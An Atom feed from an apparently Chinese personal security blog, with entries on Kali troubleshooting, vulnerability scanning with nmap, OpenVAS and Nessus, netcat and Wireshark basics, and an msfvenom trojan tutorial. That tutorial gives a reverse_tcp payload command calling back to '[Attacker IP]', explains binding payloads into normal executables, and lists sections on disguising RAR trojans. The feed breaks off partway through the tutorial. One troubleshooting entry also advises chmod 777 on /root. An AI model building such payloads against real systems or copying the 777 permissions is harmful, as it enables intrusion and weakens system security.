<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://kite-007.github.io</id>
    <title>Fr</title>
    <updated>2021-04-04T14:42:36.113Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://kite-007.github.io"/>
    <link rel="self" href="https://kite-007.github.io/atom.xml"/>
    <subtitle>意志坚定，持之以恒</subtitle>
    <logo>https://kite-007.github.io/images/avatar.png</logo>
    <icon>https://kite-007.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Fr</rights>
    <entry>
        <title type="html"><![CDATA[# KALL 问题解决]]></title>
        <id>https://kite-007.github.io/kall-wen-ti-jie-jue/</id>
        <link href="https://kite-007.github.io/kall-wen-ti-jie-jue/">
        </link>
        <updated>2021-04-04T11:22:19.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-%E5%AE%95%E6%9C%BA%E5%AF%BC%E8%87%B4i2c_piix4">1. 宕机导致i2c_piix4</a></li>
<li><a href="#2-%E5%AE%89%E8%A3%85openvas">2. 安装openvas</a>
<ul>
<li><a href="#1-rsync-error-error-in-socket-io-code-10-at-clientserverc137-receiver323">1. rsync error: error in socket IO (code 10) at clientserver.c(137) [Receiver=3.2.3]</a></li>
<li><a href="#2-root%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98">2. /root/权限问题</a></li>
<li><a href="#3-error-redis-server-is-not-running-or-not-listening-on-socket-varrunredis-openvasredis-serversock">3. ERROR: redis-server is not running or not listening on socket: /var/run/redis-openvas/redis-server.sock</a></li>
<li><a href="#4-error-no-users-found-you-need-to-create-at-least-one-user-to-log-in">4. ERROR: No users found. You need to create at least one user to log in.</a></li>
</ul>
</li>
</ul>
(问题解决)</p>
<h1 id="1-宕机导致i2c_piix4">1. 宕机导致i2c_piix4</h1>
<p>报错：</p>
<pre><code>piix4_smbus 0000:00:07.3: SMBus Host controller not enabled
</code></pre>
<br>
1. 重启kali，进入运行级别3，选择第二个，之后选择进入运行级别3
<ul>
<li><img src="https://kite-007.github.io/post-images/1617535739059.png" alt="" loading="lazy"></li>
</ul>
<ol start="2">
<li>这时出现错误：类似于图下
<ul>
<li><img src="https://kite-007.github.io/post-images/1617535894449.png" alt="" loading="lazy"></li>
</ul>
</li>
</ol>
<pre><code>Failure:File system check of the root filesystem failed
</code></pre>
<ol start="3">
<li>输入：</li>
</ol>
<pre><code># 一致按y，yes
fsck [红色方框中的路径]
或
fsck -y [红色方框中的路径]
# 直到看到initramfs命令行
</code></pre>
<ol start="4">
<li>重启kali，进入运行级别3，选择第二个，之后选择进入运行级别3，输入root密码</li>
</ol>
<pre><code>1.查明装入模块的名字：lsmod | grep i2c
# 会回显i2c_piix4 或者其他
</code></pre>
<br>
<pre><code>2.切换目录查看：
cd /etc/modprobe.d/
ls
</code></pre>
<br>
<pre><code>3. 在文件最后一行加：blacklist i2c_piix4
# 主要是libhackrf0.conf
# 但是并不确定具体是哪一个所以我都加了
# 不是root用sudo
vi [****]
按ESC退出编辑模式；
按下shift+：，输入wq!，这里是vim命令，表示强制保存并退出
</code></pre>
<br>
<pre><code>4. 重新生成引导文件：
sudo update-initramfs -u -k all
</code></pre>
<br>
<pre><code>5.重启
</code></pre>
<h1 id="2-安装openvas">2. 安装openvas</h1>
<h2 id="1-rsync-error-error-in-socket-io-code-10-at-clientserverc137-receiver323">1. rsync error: error in socket IO (code 10) at clientserver.c(137) [Receiver=3.2.3]</h2>
<ol>
<li>下载安装redis-server</li>
</ol>
<pre><code>apt search redis
apt install redis-server
</code></pre>
<ol start="2">
<li>安装firewall，开放873端口：</li>
</ol>
<pre><code>apt install firewall
firewall-cmd --permanent --add-port=873/tcp
firewall-cmd --query-port=873/tcp
firewall-cmd --reload
</code></pre>
<h2 id="2-root权限问题">2. /root/权限问题</h2>
<p>给root目录开放777权限</p>
<pre><code># root ：777
# /var/log/gvm：777
chmod 777 [目录]
</code></pre>
<h2 id="3-error-redis-server-is-not-running-or-not-listening-on-socket-varrunredis-openvasredis-serversock">3. ERROR: redis-server is not running or not listening on socket: /var/run/redis-openvas/redis-server.sock</h2>
<p>提示：FIX: You should start the redis-server with 'systemctl start redis-server@openvas.service' or configure it to listen on socket: /var/run/redis-openvas/redis-server.sock</p>
<pre><code>systemctl start redis-server@openvas.service
</code></pre>
<h2 id="4-error-no-users-found-you-need-to-create-at-least-one-user-to-log-in">4. ERROR: No users found. You need to create at least one user to log in.</h2>
<p>提示：FIX: create a user by running 'sudo runuser -u _gvm -- gvmd --create-user=&lt;name&gt; --password=&lt;password&gt;'</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# KALI 漏洞扫描]]></title>
        <id>https://kite-007.github.io/kali-lou-dong-sao-miao/</id>
        <link href="https://kite-007.github.io/kali-lou-dong-sao-miao/">
        </link>
        <updated>2021-04-01T10:13:06.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E">1. 发现漏洞</a>
<ul>
<li><a href="#1-%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E-2">1. 发现漏洞</a></li>
<li><a href="#2-%E4%BB%8E%E4%BF%A1%E6%81%AF%E7%9A%84%E7%BB%B4%E5%BA%A6%E5%AE%9A%E4%B9%89%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86">2. 从信息的维度定义漏洞管理</a></li>
<li><a href="#3-%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F%E7%B1%BB%E5%9E%8B">3. 弱点扫描类型</a></li>
<li><a href="#4-%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">4. 漏洞基本概念</a></li>
</ul>
</li>
<li><a href="#2-nmap%E5%B8%B8%E7%94%A8%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC">2. NMAP常用扫描脚本</a></li>
<li><a href="#3-%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F%E5%99%A8">3. 弱点扫描器</a>
<ul>
<li><a href="#1-openvas">1. OPENVAS</a></li>
<li><a href="#2-nessus">2. NESSUS</a></li>
</ul>
</li>
</ul>
(KALI)</p>
<h1 id="1-发现漏洞">1. 发现漏洞</h1>
<h2 id="1-发现漏洞-2">1. 发现漏洞</h2>
<ol>
<li>基于端口服务扫描结果版本信息（速度比较慢）。</li>
<li>搜索已公开的漏洞数据库（数量大）。</li>
<li>使用弱点扫描器实现漏洞管理，自动利用漏洞代码进行探测，能够快速发现目的信息。</li>
</ol>
<ul>
<li>exploit-db.com网站中存放着大量的关于漏洞以及利用的代码，可以下载漏洞源码，进行尝试。</li>
<li><img src="https://kite-007.github.io/post-images/1617272711283.png" alt="" loading="lazy"></li>
</ul>
<hr>
<ul>
<li>searchsploit 工具，kali下自带的一个漏洞查询工具</li>
<li><img src="https://kite-007.github.io/post-images/1617273103152.png" alt="" loading="lazy">
<ul>
<li>这些内容是存放在操作系统的某个目录下的，目录下会按照平台，脚本以及类型进行划分。</li>
<li>cd /usr/share/exploitdb/exploits目录下面有分类，这是可以按照搜索下面的Path目录进行访问查看。</li>
<li>vim ./multiple/remote/21490.txt</li>
<li><img src="https://kite-007.github.io/post-images/1617273524071.png" alt="" loading="lazy"></li>
</ul>
</li>
</ul>
<h2 id="2-从信息的维度定义漏洞管理">2. 从信息的维度定义漏洞管理</h2>
<ol>
<li>企业：</li>
</ol>
<ul>
<li>优先从漏洞的危险等级，从高到低进行处理，逐渐改进，不断完善。</li>
<li>信息收集
<ul>
<li>漏洞扫描器扫描发现网络IP，OS，服务，配置，漏洞</li>
<li>能力需求：定义扫描方式内容和目标。</li>
</ul>
</li>
<li>信息管理*
<ul>
<li>格式化信息，并进行筛选，分组，定义优先级</li>
<li>能力需求：资产分组，指定所有者，向所有者报告漏洞</li>
</ul>
</li>
<li>信息输出
<ul>
<li>向不同层次的人群展示足够的信息量，生成不同的报告</li>
<li>能力需求：生成报告，导出数据，SIEM集成进行统一管理</li>
</ul>
</li>
</ul>
<h2 id="3-弱点扫描类型">3. 弱点扫描类型</h2>
<ul>
<li>主动扫描
<ul>
<li>有身份验证</li>
<li>无身份验证</li>
</ul>
</li>
<li>被动扫描
<ul>
<li>镜像端口抓包</li>
<li>其他来源输入</li>
</ul>
</li>
</ul>
<pre><code>主动扫描和被动扫描都是无法进行登录目标系统，以一种接近黑盒的形式对目标系统进行探测，根据
反馈去猜测目标系统是否存在漏洞。主动扫描也可以有目标系统的登录权，可以有扫描器登入到系统
对目标进行扫描，通常情况使用不多。
</code></pre>
<ul>
<li>基于Agent的扫描
<ul>
<li>支持平台有限</li>
</ul>
</li>
</ul>
<pre><code>企业中对漏洞管理会使用的一种场景，需要在所有的服务器上面所有的设备上面，安装扫描器的a，
a工作在目标系统里面，之后会在目标系统里面进行查询，探测，软件补丁版本判断。这样，通常
下扫描的判断比较准确，效率比较高，但是比较受平台的限制，比如一些设备不可以去安装agent，
交换机，应用场景局限。
</code></pre>
<h2 id="4-漏洞基本概念">4. 漏洞基本概念</h2>
<ol>
<li>
<p>CVSS（Common Vulnerability Scoring System）</p>
<ul>
<li>通用漏洞评分系统——工业标准，CVSS是安全内容自动化协议（SCAP）的一部分，通常CVSS与CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新。
<ul>
<li>描述安全漏洞严重程度的统一评分方案，作用是给各个漏洞进行评分，按照漏洞的严重级别，给漏洞进行打分，最低0分，最高10分。</li>
</ul>
</li>
<li>不同机构按CVSS分值定义威胁的安全程度，低，中，高。</li>
<li>CVSS分值是工业标准，但威胁级别不是。</li>
<li>路由度量值
<ul>
<li>Basic Metric：基础的恒定不变的弱点权重</li>
<li>Temporal Metric：依赖时间因素的弱点权重</li>
<li>Envriomental Metric：利用弱点的环境要求和实施难度的权重</li>
</ul>
</li>
</ul>
</li>
<li>
<p>CVE（Common Vulnerabilities and Exposures）</p>
<ul>
<li>每发现一个漏洞，管理组织就会给一个编号：CVE-2008-4250
<ul>
<li>是已公开的信息安全漏洞字典，统一的漏洞编号标准</li>
<li>所有的扫描器都会遵守CVE的编号</li>
<li>发布流程：发现漏洞，CAN指定CVE ID，发布到CVE List，MITRE公司负责对内容进行编辑维护。</li>
</ul>
</li>
<li>很多厂商会维护自己的漏洞编号。
<ul>
<li>MS（微软）</li>
<li>MSKB（微软补丁）</li>
</ul>
</li>
</ul>
</li>
<li>
<p>SCAP</p>
</li>
</ol>
<h1 id="2-nmap常用扫描脚本">2. NMAP常用扫描脚本</h1>
<pre><code class="language-shell"># NMAP里包含所有脚本名称的一个文件，总共600+个
cd /usr/share/nmap/scripts
cat script.db

# safe，安全类脚本，不会对目标产生破坏
# discovery，用于发现的脚本
# vuln，用于检测漏洞的脚本
# exploit，漏洞利用
</code></pre>
<p><br><br></p>
<ul>
<li>smb-vuln-ms10-061.nse
<ul>
<li>Stuxnet蠕虫利用的4个漏洞之一，Stuxnet是美国对伊朗核设施进行攻击的震网病毒，美国军方所研发专门用来攻击伊朗核设施的一个病毒。</li>
<li>smb-vuln-ms10-061.nse通过LANMAN API枚举对方系统的共享打印机，如果发现对方的打印机的话，一些低版本的系统(win XP，Server 2003 SP2，Vista，Server 2008，win 7)的Print Spooler权限默认是不当的，通过请求Print Spooler就可以在目标系统的操作目录下去执行恶意代码，去控制目标操作系统。<br>
<br><br></li>
</ul>
</li>
<li>smb-enum-shares.nse
<ul>
<li>如果目标系统没有开放LANMAN API就可以用smb-enum-shares.nse枚举共享去发现对方的打印机。 但是需要提供管理员账号，smbuser，smbpassword。</li>
</ul>
</li>
</ul>
<pre><code class="language-shell">nmap -p445 --script=smb-enum-shares.nse --script-args=smbuser=admin,smbpassword=pass 1.1.1.1

eg：
1. # 扫描查看此网段下的主机
    nmap 192.168.200.0/24 -sn
</code></pre>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617281958281.png" alt="" loading="lazy"></li>
</ul>
<pre><code class="language-shell">2. # 对此网段下的主机进行测试查看，看有没有开放端口
nmap -p445 --script=smb-enum-shares.nse 192.168.200.*
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://kite-007.github.io/post-images/1617282092379.png" alt="" loading="lazy"></figure>
<h1 id="3-弱点扫描器">3. 弱点扫描器</h1>
<h2 id="1-openvas">1. OPENVAS</h2>
<ul>
<li>是开源的扫描器，最早是Nessus的一个项目分支，Nessus是目前世界上使用最广的一个商业的弱点扫描器。有开源版本，kali默认安装，但未配置和启用。</li>
</ul>
<ol>
<li>配置OPENVAS(早期)
<ol>
<li>安装</li>
<li>创建证书</li>
<li>同步弱点数据库</li>
<li>创建客户端证书</li>
<li>重建数据库</li>
<li>备份数据库</li>
<li>启动服务装入插件</li>
<li>创建管理员账号</li>
<li>配置服务监听端口</li>
<li>安装验证</li>
</ol>
</li>
<li>目前配置(kali)</li>
</ol>
<pre><code># 初始化安装
sudo gvm-setup

# 检查安装结果
gvm-check-setup

# 查看当前帐号
openvasmd --list-users

# 修改账号密码
openvasmd --user=admin --new-password=Password

# 升级
openvas-feed-update
</code></pre>
<p><br><br><br><br>
3. openvas体系<br>
1. openvas manager，核心组件，负责把其他不同的组件统一进行一个连接，所发出的每一个指令都是通过manager进行下发并调度执行的。<br>
2. openvas scanner，扫描器，可以管理多个scanner，扫描目标系统，当扫描的任务巨大时，它可以进行多级部署，形成一个集群式的部署方式，也可以在多台服务器上面安装scanner，通过一个manager进行调用scanner扫描不同的目标系统。<br>
3. osp scanner，osp scanner里包含了多个扫描器，是一个扫描器组，统一交给manager，进行统一管理，每一次扫描对目标系统的扫描配置都是一致的。<br>
4. Greenbone Security Assistant，绿骨头安全助理，给用户提供一个能够访问openvas manager的一个外部接口，相当于一个Web的服务器端，通过服务器端可以在客户端上面使用Web浏览器上面去访问Web接口去访问这个网站，可以通过这个网站去page去管理manager里面的内容，由manager去制定策略，去指定扫描目标，由scanner对目标进行扫描。<br>
5. gmp clients，可以使用命令行，通过api去调用管理manager。<br>
6. 通过feed更新的NVTs，SCAPCERT信息会同步到scanner，manager。<br>
7. UserData，用户数据会存在本地的数据库里面，通过manager管理。<br>
8. <img src="https://kite-007.github.io/post-images/1617285259599.png" alt="" loading="lazy"></p>
<h2 id="2-nessus">2. NESSUS</h2>
<p>下载链接：<a href="http://www.tenable.com/products/nessus/select-your-operating-system">http://www.tenable.com/products/nessus/select-your-operating-system</a></p>
<p>安装后进入下载的目录：</p>
<pre><code># 安装路径：/opt/nessus
dpkg -i [安装的压缩文件名]

# 启动服务：
/etc/init.d/nessusd start
/opt/nessus/bin ./nessusd
service nessusd start

# 查看服务信息
/etc/init.d/nessusd status
/opt/nessus/bin ./nessus-service
service nessusd status

# 管理地址
• https://127.0.0.1:8834

# 注册激活码，这个是一次性码如果你卸载，然后重新安装，你需要再次注册扫描仪，并收到另一个激活码。
• http://www.tenable.com/products/nessus-home
</code></pre>
<p><strong>以扫描主机为主</strong><br>
    与openvas大体上相同，如果需要去做一个扫描，openvas：（page文件——》目标——》text），nessus：（策略policy——》扫描scan），nessus里面默认集成了许多扫描模板，以下是2015年免费使用的模板，当然现在的模板比当时的要多好多了，这里以Advanced Scan为主。<br>
<br><br><br><br>
功能模块：</p>
<ul>
<li>
<ol>
<li>Advanced Scan(高级扫描)<br>
最经常使用的扫描。</li>
</ol>
</li>
<li>
<ol start="2">
<li>Basic Network Scan(基础网络扫描)<br>
完全的操作系统扫描，对任何主机进行一个全系统扫描。</li>
</ol>
</li>
<li>
<ol start="3">
<li>Bash Shellshock Detection(检测破壳漏洞扫描)2014</li>
</ol>
</li>
<li>
<ol start="4">
<li>Credentialed Patch Audit(身份验证信息审计)</li>
</ol>
</li>
<li>
<ol start="5">
<li>Spectre and Meltdown(幽灵病毒)2015<br>
有的版本叫做（GHOST(glibc) Detection）基于C语言最底层glibc模块的一个漏洞。</li>
</ol>
</li>
<li>
<ol start="6">
<li>Host Discovery(主机发现模板)</li>
</ol>
</li>
<li>
<ol start="7">
<li>Web Application Tests(Web应用扫描测试)<br>
通常不会使用这个模块，最新版有这个功能，但是能扫的漏洞非常少，如果需要扫描Web应用，最好使用专业的Web应用扫描器。<br>
<br><br><br></li>
</ol>
</li>
</ul>
<p>一下为Advanced Scan模块操作：</p>
<ol>
<li>进入主界面，选择policy制作策略，新增策略：</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617523402954.png" alt="" loading="lazy"></li>
</ul>
<ol start="2">
<li>nessus先创建策略，在进行Scan，这里直接选择Scan：</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617524121489.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524166643.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524179982.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524188632.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524196330.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524205328.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524232816.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524240163.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524251147.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524261430.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524275439.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524285292.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524293542.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524318178.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524327177.png" alt="" loading="lazy"></li>
</ul>
<ol start="3">
<li>开启扫描，等待完成：</li>
</ol>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617524601436.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617524848493.png" alt="" loading="lazy"></li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# KALI 基本工具]]></title>
        <id>https://kite-007.github.io/kali-ji-ben-gong-ju/</id>
        <link href="https://kite-007.github.io/kali-ji-ben-gong-ju/">
        </link>
        <updated>2021-04-01T08:50:01.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-netcat-nc">1. NETCAT-NC</a>
<ul>
<li><a href="#1-telnet">1. telnet</a></li>
<li><a href="#2-%E4%BC%A0%E8%BE%93%E6%96%87%E6%9C%AC%E4%BF%A1%E6%81%AF">2. 传输文本信息</a></li>
<li><a href="#3-%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95">3. 传输文件，目录</a></li>
<li><a href="#4-%E5%8A%A0%E5%AF%86%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6">4. 加密传输文件</a></li>
<li><a href="#5-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E6%9C%A8%E9%A9%AC">5. 远程控制，木马</a></li>
<li><a href="#6-%E5%8A%A0%E5%AF%86%E6%89%80%E6%9C%89%E6%B5%81%E9%87%8F">6. 加密所有流量</a></li>
<li><a href="#7-%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1%E5%99%A8">7. 流媒体服务器</a></li>
<li><a href="#8-%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E7%A1%AC%E7%9B%98">8. 远程克隆硬盘</a></li>
</ul>
</li>
<li><a href="#wireshark">WIRESHARK</a>
<ul>
<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
<li><a href="#%E5%90%AF%E5%8A%A8%E8%AF%95%E7%9D%80%E6%8A%93%E5%8F%96">启动试着抓取</a></li>
</ul>
</li>
</ul>
(基本工具)</p>
<h1 id="1-netcat-nc">1. NETCAT-NC</h1>
<pre><code># 查看帮助信息，可用参数
nc -h

# 显示详细的连接的相关信息，输出内容
nc -v

# 如果后面紧跟域名，则不会进行dns解析，因为一般解析dns比较慢，所以需要提前把域名解析，直接将IP交予nc使用
nc -n

nc -nv 1.1.1.1 44

# 指定端口号
nc -p 4444
</code></pre>
<h2 id="1-telnet">1. telnet</h2>
<ul>
<li>NC——TELNET / BANNER
<ul>
<li>
<p>能够连接目标端口，发送指令，连接对方服务</p>
</li>
<li></li>
</ul>
</li>
</ul>
<h2 id="2-传输文本信息">2. 传输文本信息</h2>
<h2 id="3-传输文件目录">3. 传输文件，目录</h2>
<h2 id="4-加密传输文件">4. 加密传输文件</h2>
<h2 id="5-远程控制木马">5. 远程控制，木马</h2>
<ul>
<li>杀毒软件不会查杀</li>
</ul>
<h2 id="6-加密所有流量">6. 加密所有流量</h2>
<h2 id="7-流媒体服务器">7. 流媒体服务器</h2>
<h2 id="8-远程克隆硬盘">8. 远程克隆硬盘</h2>
<h1 id="wireshark">WIRESHARK</h1>
<h2 id="介绍">介绍</h2>
<ol>
<li>主要功能为抓包嗅探和协议分析，必备工具。</li>
</ol>
<ul>
<li>在一台主机传输流量到另一台主机上面，可以用此将传输的数据流量包抓取下来，之后提取所有内容信息，抓取下来的包可以对其里面的内容进行分析，也可以保存下来，用于日后的进一步分析或者用于还原当时的网络情景。<br>
<br></li>
</ul>
<ol start="2">
<li>wireshark本来的主要功能是用于对数据包做流量分析，其抓包的功能本来不属于其本身，使用的是抓包引擎：(用这个组件进行抓取流量包之后，其会将数据流量包传递给wireshark)</li>
</ol>
<ul>
<li>Libpcap9——Linux</li>
<li>Winpcap10——Windows<br>
<br></li>
</ul>
<ol start="3">
<li>wireshark里面存在解码定义，是目前所有抓包软件中最优秀的一个，通过解码定义能够对抓取上来的数据流量包(0101···)进行解码分析。</li>
</ol>
<h2 id="启动试着抓取">启动试着抓取</h2>
<pre><code>#启动
wireshark
</code></pre>
<ol>
<li>启动之后首先要选择一个抓包的网卡</li>
</ol>
<ul>
<li>笔记本一般会有以太网网卡，有线网卡，无线网卡。服务器一般会有多个网卡。这里要指定抓取哪个网卡上面的数据包，这里选择以太网网卡eth0。</li>
<li><img src="https://kite-007.github.io/post-images/1617542012985.png" alt="" loading="lazy"><br>
<br></li>
<li>其他机器里的广播流量包或者一些其他的单通数据包(混杂模式)经过kali机器，那麽流量包就会被抓取下来。</li>
<li><img src="https://kite-007.github.io/post-images/1617542610555.png" alt="" loading="lazy"><br>
<br></li>
<li>设置过滤器，开启混杂模式时一定得过滤掉不需要的，这里可以进行选择，选择之后在方框中可以进行修改，像抓取单个机器，只抓arp包，只抓ip包，抓取端口等等。</li>
<li><img src="https://kite-007.github.io/post-images/1617543056124.png" alt="" loading="lazy"><br>
<br></li>
<li>抓取我打开的一台机器192.168.200.142的包</li>
<li><img src="https://kite-007.github.io/post-images/1617543442471.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617545465580.png" alt="" loading="lazy"><br>
<br></li>
<li>抓取的包可以进行保存，保存的文件类型也可以另存为可以兼容其他工具的类型，通常pcap兼容性比较好，有gzip选项可以进行压缩。</li>
<li><img src="https://kite-007.github.io/post-images/1617544118866.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617544432352.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617545053020.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617545113241.png" alt="" loading="lazy"></li>
<li><img src="https://kite-007.github.io/post-images/1617545301247.png" alt="" loading="lazy"><br>
<br></li>
<li>首选项里可以更改界面字体等。</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[# MSF木马使用(五)]]></title>
        <id>https://kite-007.github.io/msf-zhi-mu-ma-shi-yong-wu/</id>
        <link href="https://kite-007.github.io/msf-zhi-mu-ma-shi-yong-wu/">
        </link>
        <updated>2021-03-30T23:43:21.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC">1. 捆绑木马</a>
<ul>
<li><a href="#1-%E7%AE%80%E8%A6%81%E6%B5%81%E7%A8%8B">1. 简要流程</a></li>
<li><a href="#2-%E8%82%89%E9%B8%A1%E6%93%8D%E4%BD%9Cmeterpreter">2. 肉鸡操作(meterpreter)</a>
<ul>
<li><a href="#1-%E5%88%A9%E7%94%A8rar%E8%87%AA%E8%A7%A3%E5%8E%8B%E5%8E%9F%E7%90%86%E8%BF%90%E8%A1%8C%E6%9C%A8%E9%A9%AC">1. 利用RAR自解压原理运行木马</a></li>
<li><a href="#2-%E5%AF%B9rar%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BC%AA%E8%A3%85">2. 对RAR木马文件进行伪装</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#2-msf%E6%8F%90%E6%9D%83">2. MSF提权</a></li>
</ul>
(MSF木马使用)<br>
<em>msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行,配合meterpreter在本地监听上线。</em></p>
<p>MSF木马使用指令：msfvenom，可以查看木马使用帮助</p>
<ul>
<li><img src="https://kite-007.github.io/post-images/1617147958615.png" alt="" loading="lazy"></li>
</ul>
<p>MSF重要参数：</p>
<pre><code>-p payload设置
-e 编码设置
-a 系统结构，默认x86
-s payload最大大小
-i 编码次数
-f 生成文件格式
</code></pre>
<hr>
<p>木马OPTIONS：</p>
<table>
<thead>
<tr>
<th>选项卡1</th>
<th>选    项    卡   2</th>
<th>备注</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>-l</td>
<td>--list</td>
<td>type&gt;</td>
<td>列出指定类型的所有模块 类型包括: payloads, encoders, nops, platforms, archs, formats, all</td>
</tr>
<tr>
<td>-p</td>
<td>--payload</td>
<td>payload&gt;</td>
<td>指定需要使用的payload(有效载荷)(--list payloads得到payload列表，--list-options得到指定payload的参数)，如果需要使用自定义的payload,请使用'-'或者stdin指定</td>
</tr>
<tr>
<td></td>
<td>--list-options</td>
<td></td>
<td>列出指定payload的标准,高级和规避选项  例如:msfvenom -p generic/shell_bind_tcp --list-options ，将列出shell_bind_tcp这个payload的各种选项信息</td>
</tr>
<tr>
<td>-f</td>
<td>--format</td>
<td>format&gt;</td>
<td>指定输出格式(使用 --list formats 列出所有的格式)</td>
</tr>
<tr>
<td>-e</td>
<td>--encoding</td>
<td>encoder&gt;</td>
<td>要使用的编码(使用 --list encoders 列出所有的编码) 用于编码加密</td>
</tr>
<tr>
<td></td>
<td>--smallest</td>
<td></td>
<td></td>
</tr>
<tr>
<td>-a</td>
<td>--arch</td>
<td>arch&gt;</td>
<td>指定payload的目标CPU架构(使用 --list archs 列出所有的CPU架构)</td>
</tr>
<tr>
<td></td>
<td>--platform</td>
<td>platform&gt;</td>
<td>指定payload的目标操作系统平台(使用 --list platforms 列出所有的操作系统平台)</td>
</tr>
<tr>
<td>-o</td>
<td>--out</td>
<td>path&gt;</td>
<td>将payload保存到文件中</td>
</tr>
<tr>
<td>-b</td>
<td>--bad-chars</td>
<td>list&gt;</td>
<td>指定不使用的字符集 例如:不使用'\x00\xff'这两个字符</td>
</tr>
<tr>
<td>-n</td>
<td>--nopsled</td>
<td>length&gt;</td>
<td>在payload上添加指定长度的nop指令</td>
</tr>
<tr>
<td>-s</td>
<td>--space</td>
<td>length&gt;</td>
<td>设定payload的最大长度    即生成的文件大小</td>
</tr>
<tr>
<td></td>
<td>--encoder-space</td>
<td>length&gt;</td>
<td>设定编码payload的最大长度(默认为-s的值)</td>
</tr>
<tr>
<td>-i</td>
<td>--iterations</td>
<td>count&gt;</td>
<td>对payload进行编码的次数</td>
</tr>
<tr>
<td>-c</td>
<td>--add-code</td>
<td>path&gt;</td>
<td>指定一个自己的win32 shellcode文件</td>
</tr>
<tr>
<td>-x</td>
<td>--template</td>
<td>path&gt;</td>
<td>指定一个可执行程序 将payload捆绑其中,例如:原先有个正常文件normal.exe 通过此选项把payload捆绑到这个程序上面</td>
</tr>
<tr>
<td>-k</td>
<td>--keep</td>
<td></td>
<td>针对-x中的捆绑程序 将创建新线程执行payload 一般情况-x -k选项一起使用</td>
</tr>
<tr>
<td>-v</td>
<td>--var-name</td>
<td>value&gt;</td>
<td>指定用于某些输出格式的自定义变量名称</td>
</tr>
<tr>
<td>-t</td>
<td>--timeout</td>
<td>second&gt;</td>
<td>从STDIN读取有效负载时等待的秒数(默认为30, 0为禁用)</td>
</tr>
<tr>
<td>-h</td>
<td>--help</td>
<td></td>
<td>查看帮助</td>
</tr>
</tbody>
</table>
<hr>
<ol>
<li>msfvenmo木马生成：</li>
</ol>
<ul>
<li>生成木马是由两个必要的参数-p以及-f</li>
<li>-p：用来指定所需要设置的payload</li>
</ul>
<pre><code class="language-shell">./msfvenom –l payloads      //查看所有msf可用的payload列表
</code></pre>
<ul>
<li>-f：用来指定payload的输出格式</li>
</ul>
<pre><code class="language-shell">./msfvenom -p windows/meterpreter/bind_tcp -f exe
./msfvenom --help –formats      //查看msf支持的输出格式
</code></pre>
<ul>
<li>msfvenom举例：</li>
</ul>
<pre><code class="language-shell">$./msfvenom -p windows/meterpreter/reverse_tcplhost=[Attacker IP]lport=4444 -f  exe -o /tmp/my_payload.exe
</code></pre>
<hr>
<p><strong>这里在win 7举例</strong></p>
<h1 id="1-捆绑木马">1. 捆绑木马</h1>
<h2 id="1-简要流程">1. 简要流程</h2>
<ol>
<li>生成木马</li>
</ol>
